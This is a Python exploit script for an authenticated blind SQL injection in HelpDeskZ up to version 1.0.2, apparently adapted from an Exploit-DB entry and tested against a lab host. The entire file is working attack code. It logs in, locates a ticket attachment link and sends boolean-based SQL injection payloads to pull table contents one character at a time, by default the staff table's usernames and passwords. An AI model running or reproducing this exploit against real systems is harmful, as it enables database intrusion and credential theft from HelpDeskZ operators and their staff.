#!/usr/bin/env python3
"""
HelpDeskZ <= v1.0.2 - Authorized SQL Injection
This is my updated version of the exploit-db.com
'HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized 
File Download' exploit.
Original Exploit: https://www.exploit-db.com/exploits/41200
Tested on: Kali Lincox (the louder u r the less u hear)
"""

from argparse import ArgumentParser
from time import sleep
import string
import sys
import urllib.parse


import requests
from termcolor import colored
from bs4 import BeautifulSoup

class Entry:
    """
    Is meant to ease table entry handling.
    """
    def __init__(self, offset, columns):
        """
        Initializes the object.

        Args:
            self (Entry): the object itself.
            offset (int): entry offset.
            columns (list(str...)): list of desired columns.
        Returns:
            (Entry): 'Entry' object
        """
        self.offset = offset
        self.columns = columns
        self.row_length = {}
        self.row_value = {}
        for column in columns:
            self.row_length[f"{column}"] = 0
            self.row_value[f"{column}"] = []

    def update_length(self, column, length):
        """
        Updates both self.row_length and self.row_value to
        reflect length assignment.

        Args:
            self (Entry): the object itself.
            column (str): column which length should be updated.
            length (int): length of column value
        Returns:
            None
        """
        if column not in self.columns:
            print_failure(f"Error: object does not possess column \"{column}\".")
            sys.exit(1)
        self.row_length[f"{column}"] = length
        self.row_value[f"{column}"] = ['_' for _ in range(0, self.row_length[f"{column}"])]

    def update_character(self, column, index, character):
        """
        Updates self.row_value to reflect character assignment.

        Args:
            self (Entry): the object itself.
            column (str): column which the value belongs to.
            index (int): character index of to be updated character.
            character (str): new character value.
        Returns:
            None
        """
        if column not in self.columns:
            print_failure(f"Error: object does not possess column \"{column}\".")
            sys.exit(1)
        if index >= self.row_length[f"{column}"]:
            print_failure(f"Error: index: \"{index}\" out of range!.")
            sys.exit(1)
        self.row_value[f"{column}"][index] = character

    def __str__(self):
        """
        Returns sexy object representation, used in print_update.

        Args:
            self (Entry): the object itself.
        Returns:
            str: sexy Entry object representation.
        """
        return f'{self.offset}:' + '|'.join( [ f'({self.row_length[f"{column}"]})'
            + ''.join(self.row_value[f"{column}"]) for column in self.columns] )

    @staticmethod
    def print_update(entries, title=None):
        """
        Prints sexy object representation.

        Args:
            entries (list(Entry...)): list of Entry objects.
            title (str): optional title to print at the first line.
        Returns:
            None
        """
        print("\033c")
        if title is not None:
            print( colored(f"{title}", 'magenta') )
        for entry in entries:
            print( colored(f"{entry}", 'red', attrs=['reverse']) )



def print_info(output):
    """
    Prints informational output.

    Args:
        output (str): String to be printed.

    Returns:
        None
    """
    info_symbol="(*)"
    print( colored(f"{info_symbol}", "light_yellow" ),
        colored(f"{output}", "yellow") )


def print_success(output):
    """
    Prints success output.

    Args:
        output (str): String to be printed.

    Returns:
        None
    """
    success_symbol="(+)"
    print( colored(f"{success_symbol}", "light_green" ),
        colored(f"{output}", "green") )


def print_failure(output):
    """
    Prints failure output.

    Args:
        output (str): String to be printed.

    Returns:
        None
    """
    failure_symbol="(-)"
    print( colored(f"{failure_symbol}", "light_red" ),
        colored(f"{output}", "red") )


def get_bool(connection, url):
    """
    Fetches the specified URL via GET request and checks for indication
    of a "Page not found" error.
    If page is not of expected format, function closes the script.

    Args:
        connection (requests.sessions.Session): Active HTTP session.
        url (str): SQL-injection vulnerable ticket attachment link.
    Returns:
        bool: conditional return of serverside-executed SQL condition.
    """
    response = connection.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    error_element= soup.find("title")
    if error_element is None:
        return True
    if error_element.contents == ['Page not found - 404']:
        return False
    print_failure("Invalid response detected.")
    print_failure("Response:")
    print(f"{response.content}")
    sys.exit(1)

def get_csrfhash(connection, url):
    """
    Fetches the csrfhash needed for login by parsing the
    main helpdeskz page via GET.

    Args:
        connection (requests.sessions.Session): Active HTTP session.
        url (str): root HelpDeskZ service url.
    Return:
        str: CSRF hash value.
    """
    response = connection.get(url + "")
    soup = BeautifulSoup(response.content, 'html.parser')
    csrftag = soup.find("input", attrs={"name":"csrfhash"})
    if csrftag is None:
        print_failure("Failed to fetch csrfhash.")
        print_failure("Response:")
        print(f"{response.content}")
        sys.exit(1)
    csrfhash = csrftag["value"]
    return csrfhash

def get_ticket_link(connection, url, email, password, csrfhash):
    """
    Fetches the link to a submitted ticket by logging in and parsing
    the page returned after login.

    Args:
        connection (requests.sessions.Session): Active HTTP session.
        url (str): root HelpDeskZ service url.
        email (str): an authenticated user's email address.
        password (str): an authenticated user's password.
        csrfhash (str): CSRF hash value needed for login.
    Return:
        str: link to a submitted ticket.
    """
    login_data = {
            "do" :          "login",
            "csrfhash" :    f"{csrfhash}",
            "email" :       f"{email}",
            "password":     f"{password}",
            "btn" :         "Login"
    }

    response = connection.post(url + "?v=login", data=login_data)
    soup = BeautifulSoup(response.content, 'html.parser')
    ticket_tag = soup.find("a", attrs={"class":"ticket_subject"})
    if ticket_tag is None:
        print_failure("Failed to fetch the ticket link.")
        print_failure("Most likely either the url was not denoted properly,")
        print_failure("or the ticket does not exist,")
        print_failure("Refer to help page for both")
        print_failure("Response:")
        print(f"{response.content}")
        sys.exit(1)
    ticket_link=ticket_tag["href"]
    return ticket_link


def get_attachment_link(connection, ticket_link):
    """
    Fetches the download link for the file attached with the ticket 
    via GET request. This link is vulnerable to SQL injection.
    
    Args:
        connection (requests.sessions.Session): Active HTTP session.
        ticket_link (str): link to the submitted ticket.
    Return:
        str: vulnerable download link to the attached file.
        
    """

    response = connection.get(f"{ticket_link}")
    soup = BeautifulSoup(response.content, 'html.parser')
    attachment_tag = soup.find("a", attrs={"target":"_blank"})
    if attachment_tag is None:
        print_failure("Failed to fetch the full vulnerable url.")
        print_failure("This may be due to an existing ticket's lack")
        print_failure("lack of file attachment.")
        print_failure("Delete file-less ticket and create one with ")
        print_failure("a file attached to it!")
        print_failure("Response:")
        print(f"{response.content}")
        sys.exit(1)
    attachment_url = attachment_tag["href"]
    return attachment_url

def assert_valid_table(connection, attachment_url, table):
    """
    Checks if the supplied table is a valid table on the database
    by executing a conditional SQL query. Exits if table is not 
    valid.

    Args:
        connection (requests.sessions.Session): Active HTTP session.
        attachment_url (str): vulnerable download link to the attached
            file.
        table (str): table to be verified.
    Return:
        None
    """

    payload_raw = " AND 1=(SELECT 1 FROM _TABLE_ LIMIT 1) ; -- a"
    payload_raw = payload_raw.replace("_TABLE_", f"{table}")
    payload_encoded = urllib.parse.quote_plus(payload_raw)
    result = get_bool(connection, attachment_url + payload_encoded)
    if result is False:
        print_failure(f"\'{table}\' table does not exist.")
        sys.exit(1)

def assert_valid_column(connection, attachment_url, table, column):
    """
    Checks if the supplied column is a valid column in the table on the
    database via a conditional SQL query. Exits if column is invalid.

    Args:
        connection (requests.sessions.Session): Active HTTP session.
        attachment_url (str): vulnerable download link to the attached file.
        table (str): table of interest.
        column (str): column to check.
    Return:
        None
    """

    payload_raw = (" AND 1=(SELECT 1 FROM information_schema.columns WHERE "
        "table_name = \'_TABLE_\' AND column_name = \'_COLUMN_\' LIMIT 1); -- a")
    payload_raw = payload_raw.replace("_TABLE_", f"{table}")
    payload_raw = payload_raw.replace("_COLUMN_", f"{column}")
    payload_encoded = urllib.parse.quote_plus(payload_raw)
    result = get_bool(connection, attachment_url + payload_encoded)
    if result is False:
        print_failure(f"\'{column}\' column does not exist.")
        sys.exit(1)

def get_entry_count(connection, attachment_url, table):
    """
    Iteratively guesses the count of the entires inside the table.

    Args:
        connection (requests.sessions.Session): Active HTTP session.
        attachment_url (str): vulnerable download link to the attached file.
        table (str): table of interest.
    Returns:
        int: count of entries present
    """
    count = 0
    while True:
        payload_raw = " AND _COUNT_=(SELECT COUNT(*) FROM _TABLE_ ) ; -- a"
        payload_raw = payload_raw.replace("_COUNT_", f"{count}")
        payload_raw = payload_raw.replace("_TABLE_", f"{table}")
        payload_encoded = urllib.parse.quote_plus(payload_raw)
        result = get_bool(connection, attachment_url + payload_encoded)
        if result is True:
            break
        count += 1
    return count


def main():
    """
    Script's main place of code execution.
    """

    # argument parsing

    parser = ArgumentParser(description=("Script exploiting the HelpdeskZ <= "
                                        "v1.0.2 Authenticated SQL Injection "
                                        "vulnerability."),
                            epilog=("Before running this script, make sure to "
                                    "login as a authenticated user on the "
                                    "service and create a ticket with a file "
                                    "attached to it (can be any file, even empty).") )
    parser.add_argument("url",
                        type=str,
                        help="root address of the HelpDeskZ service, WITH A SLASH AT THE END."
                            "(eg. \"http://aid.htb/assistance/\" )")
    parser.add_argument("email",
                        type=str,
                        help="authenticated user's login email address "
                            "(eg. \"aidme@aidme.com\" )")
    parser.add_argument("password",
                        type=str,
                        help="authenticated user's login password "
                            "(eg. \"godaidmecouldyou\" )")
    parser.add_argument("--table",
                        type=str,
                        default="staff",
                        help="Table of interest (default = \"staff\").")
    parser.add_argument("--columns",
                        type=str,
                        default="username,password",
                        help="Column(s) of interest (default = \"username,password\").")
    args = parser.parse_args()

    URL=f"{args.url}"
    EMAIL=f"{args.email}"
    PASSWORD=f"{args.password}"
    TABLE=f"{args.table}"
    COLUMNS=args.columns.split(',')


    # create session for ease of eg. cookie handling
    connection = requests.Session()


    csrfhash = get_csrfhash(connection, URL)
    print_success(f"Csrfhash: \"{csrfhash}\" .")


    ticket_link = get_ticket_link(connection, URL, EMAIL, PASSWORD, csrfhash)
    print_success(f"Ticket link: \"{ticket_link}\" .")


    attachment_url = get_attachment_link(connection, ticket_link)
    print_success(f"Full vulnerable url: \"{attachment_url}\" .")


    assert_valid_table(connection, attachment_url, TABLE)
    print_info(f"Table: \"{TABLE}\" exists.")


    for column in COLUMNS:
        assert_valid_column(connection, attachment_url, TABLE, column)
        print_info(f"\'{column}\' column exists.")


    entry_count = get_entry_count(connection, attachment_url, TABLE)
    print_success(f"{entry_count} entries detected.")

    # add time delay for the suspense!
    sleep(2)


    entries = []
    for offset in range(0, entry_count):
        entries.append(Entry(offset, COLUMNS))

    # determine length of every value  to be extracted
    for entry in entries:
        for column in entry.columns:
            length = 0
            while True:
                payload_raw = (" AND _LENGTH_=( SELECT LENGTH( _COLUMN_) FROM "
                    "_TABLE_ ORDER BY id LIMIT 1 OFFSET _OFFSET_ ) ; -- a")
                payload_raw = payload_raw.replace("_LENGTH_", f"{length}")
                payload_raw = payload_raw.replace("_COLUMN_", f"{column}")
                payload_raw = payload_raw.replace("_TABLE_", f"{TABLE}")
                payload_raw = payload_raw.replace("_OFFSET_", f"{entry.offset}")
                payload_encoded = urllib.parse.quote_plus(payload_raw)
                entry.update_length(f"{column}", length)
                Entry.print_update(entries, title="Extracting:")
                result = get_bool(connection, attachment_url + payload_encoded)
                if result is True:
                    break
                length += 1



    alphanum_chars = list(string.ascii_lowercase + string.ascii_uppercase \
                    + string.digits + string.punctuation)

    # extract values
    for entry in entries:
        for column in entry.columns:
            for character_position in range(0,entry.row_length[f"{column}"]):
                for character in alphanum_chars:
                    # sql indexes start from 1
                    character_position_sql = character_position + 1
                    payload_raw = (" AND \'_CHAR_\'=( SELECT SUBSTRING( _COLUMN_, "
                        "_START_POINT_, 1) FROM _TABLE_ ORDER BY id LIMIT 1 OFFSET "
                        "_OFFSET_ ) ; -- a")
                    payload_raw = payload_raw.replace("_CHAR_", f"{character}")
                    payload_raw = payload_raw.replace("_COLUMN_", f"{column}")
                    payload_raw = payload_raw.replace("_START_POINT_", f"{character_position_sql}")
                    payload_raw = payload_raw.replace("_TABLE_", f"{TABLE}")
                    payload_raw = payload_raw.replace("_OFFSET_", f"{entry.offset}")
                    payload_encoded = urllib.parse.quote_plus(payload_raw)
                    entry.update_character(f"{column}", character_position, character)
                    Entry.print_update(entries, title="Extracting:")
                    result = get_bool(connection, attachment_url + payload_encoded)
                    if result is True:
                        break
    Entry.print_update(entries, title="Extraction complete:")





    sys.exit(1)

if __name__ == "__main__":
    main()
